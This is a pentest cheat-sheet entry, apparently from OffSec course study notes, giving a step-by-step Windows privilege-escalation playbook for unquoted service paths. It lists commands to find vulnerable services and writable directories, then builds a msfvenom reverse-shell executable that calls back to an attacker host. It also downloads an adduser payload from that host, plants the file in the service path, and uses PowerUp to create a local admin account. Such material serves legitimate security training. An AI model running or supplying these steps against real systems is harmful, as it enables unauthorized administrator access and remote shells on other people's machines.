title: Unquoted Service Path
body: Service path with spaces and NO quotes = Windows parses left-to-right, trying each space-delimited prefix + .exe as the executable. Module 17.2.3: drop your binary at the FIRST interpreted path you can write to. You need Write on a prefix DIR but do NOT need to replace the real binary (that's weak_service). Requires the space+no-quote combo AND a writable interpreted dir.
cmd:
# == STEP 1: FIND UNQUOTED PATHS WITH SPACES ==========
# cmd.exe avoids PowerShell quote-escaping pain here:
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
# PowerShell equivalent:
Get-CimInstance win32_service | Select Name,PathName,StartMode | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -notlike '*:\Windows\*' -and $_.PathName -match ' '}
# Per-service:
sc qc <ServiceName>

# == STEP 2: WRITE OUT THE INTERPRETED PATHS ==========
# Example: C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
# Windows tries, in order:
#   C:\Program.exe
#   C:\Program Files\Enterprise.exe
#   C:\Program Files\Enterprise Apps\Current.exe    <- often the winnable one
#   C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
# You name your payload after the FILENAME at the space, in that PREFIX dir.

# == STEP 3: FIND WHICH PREFIX DIR YOU CAN WRITE ======
# Check each interpreted DIR with icacls. C:\ and C:\Program Files
# are almost never writable by Users - the software's own dir often IS.
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
# Look for BUILTIN\Users:(...W...) or Authenticated Users with (W)/(M)/(F).
# In the OffSec lab: Users had (RX,W) on 'Enterprise Apps' -> writable ->
# payload goes to C:\Program Files\Enterprise Apps\Current.exe

# == STEP 4: CAN YOU RESTART IT YOURSELF? =============
# If yes, no reboot needed (unlike weak_service).
Start-Service <ServiceName>
Stop-Service  <ServiceName>
# Denied? fall back to reboot (needs SeShutdownPrivilege) or wait.

# == STEP 5: BUILD + PLACE PAYLOAD ====================
# Reuse adduser.exe (see win_compile) or msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o Current.exe
iwr http://$lhost/adduser.exe -Outfile Current.exe
copy .\Current.exe "C:\Program Files\Enterprise Apps\Current.exe"

# == STEP 6: TRIGGER + VERIFY =========================
Start-Service <ServiceName>
# EXPECT AN ERROR HERE and DON'T PANIC: the service fails to "start"
# because your adduser.exe doesn't speak the Service Control protocol /
# ignores the leftover args. The payload STILL EXECUTED. Verify:
net user
net localgroup administrators

# == POWERUP AUTOMATION ===============================
. .\PowerUp.ps1
Get-UnquotedService
# AbuseFunction default creates local admin 'john' / 'Password123!'
Write-ServiceBinary -Name '<ServiceName>' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service <ServiceName>   # same benign "failed to start" - check net user

# == RESTORE ==========================================
Stop-Service <ServiceName>; del "C:\Program Files\Enterprise Apps\Current.exe"
# original GammaServ.exe is used again once your file is gone
warn: The Start-Service 'cannot be started' error is EXPECTED - your adduser payload isn't a real service binary, but it ran before failing. Always check net localgroup administrators before assuming it didn't work. Requirements: (1) space in path, (2) no quotes, (3) Write on an interpreted prefix dir. Miss any one and this vector is out - pivot to weak_service or DLL hijack.

choices.label: Service restarted - payload ran (ignore the error)
Can't write any prefix dir - try weak service perms
Can write the binary itself - use DLL hijack
